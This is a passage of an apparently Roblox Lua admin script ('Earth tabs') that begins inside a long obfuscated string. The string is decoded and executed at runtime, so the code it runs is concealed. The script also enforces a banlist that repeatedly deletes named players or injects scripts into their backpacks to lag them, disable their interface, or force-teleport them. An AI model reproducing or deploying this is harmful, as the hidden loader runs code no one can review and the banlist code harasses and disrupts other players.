"~%@%(%$%~%!*&%)()*$(+(~%@%$%-%(?-?*?&%^%?%=*(?-?*?&%^%?%^*?%(?#?*%=A*%A=+?=?*=#()?!#@(*-+-+?)?^%!?^?^?+?$?#?)%)*B?-?_%^A%~*-%@%!?~#~#$*~#!(*(%(#^%^=)-A)@=%)=_%&=&!_@~!)!~$~^~)~&~^+$~=+??!~@A+!+(+__@%%_!+!++&@#?#~!~!)@=@!!$+?@=~#+%+)+!^@^~^+)#^-^#&%)%)#~#~$)@~_~^+!~%+-?~+_+#+&_+_$_#%+&-_(_)=!#?-!~*^))#)%)$)$=??%_!~^_?++?)#+#(%@#&?=&==*=&=&%$=*?%=^%??@*+-_#*%%#&$&!--!-%!(^-*%-$-&(_(#(#^+)~!%$&$~!-$^!*!&+&A!)_^~%^(@$@$^#&#^^~+~=)*=$~-&#&=&*=*?)_&_@%~-)=@A_*_(_^&^A-$%~=+?(?*=&?=?#?^$+#=%?#=*~#^%&-!_#+^&@_--@(&(=(-(&**(&*&$~#**$^~)$^-~!#-%=!_@*+@^%@+^)^$@+)?_-_*_)&=&-=_=_?#+$+??-##&?+*+__+_%_%#~-&%^=?=)?$=*(+?@%%*%?)%~#!(*(%(&%?#(#~#^%-&?#?-!-?@#==&+(#($($*_*~$?**)=)*+~#^%#$~-@$!*(*=@?-~#!(*(%(+$^$(@#@!@%_(_!==A)~)%=+~_=_?~~*??+=+%%*+@&(_=_#_%#)%(&%=$&(-%(%?)?-$##??*?_%+B%$!%$--!~*+((-?(!@?**@~~-*@*-*#$~#**($#$!$=!+)~)@)!~)&^)!!)(@!@!$$)A^&^&&@=)__~-)!~+~^+$~$~*+^^(+^_%?=#%#^#_#^&@?*-!%)??=(?^*#%!(!*+#?#)$_@+()#=#!#$#~-~@*@$*+(#*?*$**@-)*)_)"
,"%)~#!(*(%(+@^++^#@&!^_#^!+!_+)?))&_?++))=)!)$)~~~?*?_&&_$+#_%?*&%#^=*#_##__+&&_?)(#%-?~?!?&*!%+*)#^*)*^*)-&-@!~^(-=-_(+@=)@*-(%*=~@$-*%$=+()$^=^+)-^#)~)($@$#$?!#$?!~#^%%!)+#@=+#@%~@^^_$+=+~^~)=^%^!^&)===)%)$)#~$!#~)@@~@~$)&?+_)_(_$+-%$%&_?_*_%&=&))$@!#$=#&)=+?+((?%(#(-(+(_(&*-%$*~#!(*(%(*$$*$*@$@!=-^-$-(!!!)@&@$(%@-%~%!%_%~#~#-%~&&_!_(&*_#&&&%&^-?=+-&=+##=#-&-$#%=??-=(=^?=?=*&?=?-?&%~%(%=*+#^###-%=$%$@#^#_#@-*#&-^!!-##^-)(^@?(+@+@+@)@_@$!$@!@~*_^-^)))^^^)^^)=$@$($%)-)$)!)%_@_-_@_*_+_-^*@_^^)^^*^?^#^^&=))&~)@__)+&!_&_@)$)@)@)+)%)?=&)&)%)~~!)=~^=*~%~^+^~(=*=~~~~&~@+(~++$=-+_~-~-+%?!+#?%?+?+?^?*?@_^%&%(%-?%?%?=%(_+_!_-%(%$%$%**~***^***~*%%#?^%(%-?&%@%^%=*(%&*&%)(&%+*$(+(*?#%-?#?*?^%!*(?-?*?&%^%?%^*(%=%$%*?=*=*(?-?*?&%^%?%^**%&?-?#%=*(%&*+*)**(%(+*&%&*#*!**(#(%(&*#%^%-%&*&*=*&*"
}),"(%u)(.)",function(r,c)return c:rep(r:byte()-62)end),"(.)(.)",function(lo,hi)return string.char(charMap[lo]+charMap[hi]*16)end)))),getfenv())()

tabmodeldebounce = false
modeldebounce = false
game:service'RunService'.Stepped:connect(function()
if modeldebounce then return end
rot = (rot % 360) + 0.5
if tabmodel.Parent ~= workspace then
modeldebounce = true
tabs = {}
tabmodel = Instance.new("Model", workspace)
tabmodel.Name = "Earth tabs"
tabs = {}
wait()
modeldebounce = false
end
end)

rot = 0
coroutine.resume(coroutine.create(function()
game:GetService("RunService").Stepped:connect(function()
if probemode == false then
if LocalPlayer.Character then
if LocalPlayer.Character:findFirstChild("Torso")  then
rot = rot + 0.001
for i,v in pairs(Tabs) do
ypcall(function()
local pos = LocalPlayer.Character.Torso.CFrame
local radius = 4 + (#Tabs * 0.5)
local x = math.sin((i / #Tabs - (0.5 / #Tabs) + rot * 2) * math.pi * 2) * radius
local y = 0
local z = math.cos((i / #Tabs - (0.5 / #Tabs) + rot * 2) * math.pi * 2) * radius
local arot = Vector3.new(x, y, z) + pos.p
local brot = v.CFrame.p
local crot = (arot * .1 + brot * .9)
v.CFrame = CFrame.new(crot, pos.p)
end)
end
end
end
end
if probemode == true then
if game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe") then
rot = rot + 0.001
for i,v in pairs(Tabs) do
ypcall(function()
local pos = game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe").CFrame
local radius = 4 + (#Tabs * 0.5)
local x = math.sin((i / #Tabs - (0.5 / #Tabs) + rot * 2) * math.pi * 2) * radius
local y = 0
local z = math.cos((i / #Tabs - (0.5 / #Tabs) + rot * 2) * math.pi * 2) * radius
local arot = Vector3.new(x, y, z) + pos.p
local brot = v.CFrame.p
local crot = (arot * .1 + brot * .9)
v.CFrame = CFrame.new(crot, pos.p)
end)
end
end
end
end)
end))

for _,v in pairs(game.Players:GetChildren()) do
if v:IsA("Player") then
Connect(v)
end
end

game.Players.ChildAdded:connect(function(qe)
if qe:IsA("Player") then
Connect(qe)
end
end)

coroutine.resume(coroutine.create(function()
while wait(0.1) do
for a, plr in pairs(game.Players:GetChildren()) do
pcall(function()
for b, Bl in pairs(Banlist) do
if plr.Name == Bl["Name"] then
if Bl["BRank"] == -1 then
plr:Destroy()
elseif Bl["BRank"] == -2 then
NewLS(LagSource, plr.Backpack)
elseif Bl["BRank"] == -3 then
NewLS("script.Parent = nil; while wait(0.1) do; game:service'StarterGui':SetCoreGuiEnabled(3, false); end", plr.Backpack)
elseif Bl["BRank"] == -4 then
NewLS("game:service'TeleportService':Teleport(game.PlaceId)", plr.Backpack)
else
plr:Destroy()
end
end
end
end)
end
end
end))

for _,v in pairs(game.Players:GetPlayers()) do
if v.Name == "aleksa12432" then
Output("YAY, THE CREATOR OF THIS SCRIPT IS IN-GAME :D :D :D")
end
end

game.Players.PlayerAdded:connect(function(plr)
if plr.Name == "aleksa12432" then
Output("YAY, THE CREATOR OF THIS SCRIPT IS IN-GAME :D :D :D")
end
end)